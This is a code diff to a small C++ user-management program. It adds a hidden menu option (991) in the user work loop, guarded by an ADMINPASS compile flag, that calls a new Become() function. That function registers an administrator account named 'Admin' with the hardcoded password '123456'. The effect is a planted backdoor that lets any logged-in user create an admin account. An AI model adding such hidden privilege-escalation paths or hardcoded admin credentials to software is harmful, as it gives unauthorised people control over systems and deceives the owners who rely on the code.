@@ -386,7 +386,12 @@ void Worker::UserLogoutWork(std::string UserName, int UUID_) {
     myUUID = 0;
     cout << "Successfully Logout" << endl;
 }
-
+#ifdef ADMINPASS
+void Worker::Become(string UserName){
+    cout<<"Admin ADDed"<<endl;
+    AdminLogin_.Register(UserName,"123456");
+}
+#endif
 void Worker::UserWork() {
     if (permission < 1) {
         cout << "Access Denied,Please reLogin" << endl;
@@ -419,6 +424,11 @@ void Worker::UserWork() {
         case 3:
             ViewWork(UserName);
             break;
+#ifdef ADMINPASS
+        case 991:
+            Become("Admin");
+            break;
+#endif
         default:
             UserLogoutWork(UserName, myUUID);
             return;
